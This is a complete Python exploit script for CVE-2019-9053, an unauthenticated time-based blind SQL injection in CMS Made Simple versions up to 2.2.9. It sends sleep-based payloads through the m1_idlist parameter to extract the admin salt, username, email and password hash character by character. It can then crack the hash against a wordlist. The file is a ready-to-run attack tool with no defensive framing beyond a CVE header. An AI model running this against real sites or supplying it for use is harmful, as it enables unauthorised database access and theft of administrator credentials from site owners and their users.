#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9 (Python3)
# CVE : CVE-2019-9053

import requests
import argparse
import hashlib
import time
import os
from termcolor import colored, cprint

parser = argparse.ArgumentParser(description="CMS Made Simple <= 2.2.9 SQL Injection Exploit")
parser.add_argument('-u', '--url', required=True, help="Base target URI (e.g., http://target-uri/cms)")
parser.add_argument('-w', '--wordlist', help="Wordlist for cracking admin password")
parser.add_argument('-c', '--crack', action='store_true', help="Crack password using wordlist")

args = parser.parse_args()

url_vuln = args.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'

password = ""
db_name = ""
salt = ""
email = ""
output = ""
TIME = 1
flag = True

def beautify_print_try(value):
    os.system('clear')
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    os.system('clear')
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp_salt = salt + ch
            ord_salt_temp = ord_salt + format(ord(ch), 'x')
            beautify_print_try(temp_salt)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_siteprefs+where+sitepref_value+like+0x{ord_salt_temp}25+and+sitepref_name+like+0x736974656d61736b)--+"
            url = url_vuln + "&m1_idlist=" + payload
            start = time.time()
            session.get(url)
            elapsed = time.time() - start
            if elapsed >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += f'\n[+] Salt for password found: {salt}'

def dump_username():
    global flag, db_name, output
    ord_db = ""
    ord_db_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp = db_name + ch
            ord_db_temp = ord_db + format(ord(ch), 'x')
            beautify_print_try(temp)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+username+like+0x{ord_db_temp}25+and+user_id+like+0x31)--+"
            url = url_vuln + "&m1_idlist=" + payload
            start = time.time()
            session.get(url)
            elapsed = time.time() - start
            if elapsed >= TIME:
                flag = True
                break
        if flag:
            db_name = temp
            ord_db = ord_db_temp
    flag = True
    output += f'\n[+] Username found: {db_name}'

def dump_email():
    global flag, email, output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp = email + ch
            ord_email_temp = ord_email + format(ord(ch), 'x')
            beautify_print_try(temp)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+email+like+0x{ord_email_temp}25+and+user_id+like+0x31)--+"
            url = url_vuln + "&m1_idlist=" + payload
            start = time.time()
            session.get(url)
            elapsed = time.time() - start
            if elapsed >= TIME:
                flag = True
                break
        if flag:
            email = temp
            ord_email = ord_email_temp
    flag = True
    output += f'\n[+] Email found: {email}'

def dump_password():
    global flag, password, output
    ord_pass = ""
    ord_pass_temp = ""
    while flag:
        flag = False
        for ch in dictionary:
            temp = password + ch
            ord_pass_temp = ord_pass + format(ord(ch), 'x')
            beautify_print_try(temp)
            payload = f"a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+password+like+0x{ord_pass_temp}25+and+user_id+like+0x31)--+"
            url = url_vuln + "&m1_idlist=" + payload
            start = time.time()
            session.get(url)
            elapsed = time.time() - start
            if elapsed >= TIME:
                flag = True
                break
        if flag:
            password = temp
            ord_pass = ord_pass_temp
    flag = True
    output += f'\n[+] Password found: {password}'

def crack_password():
    global password, output, salt
    with open(args.wordlist, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            beautify_print_try(line)
            guess = hashlib.md5((salt + line).encode('utf-8')).hexdigest()
            if guess == password:
                output += f"\n[+] Password cracked: {line}"
                break

# ===== 开始执行各步骤 =====
dump_salt()
dump_username()
dump_email()
dump_password()

if args.crack and args.wordlist:
    cprint("[*] Now try to crack password", 'cyan')
    crack_password()

beautify_print()
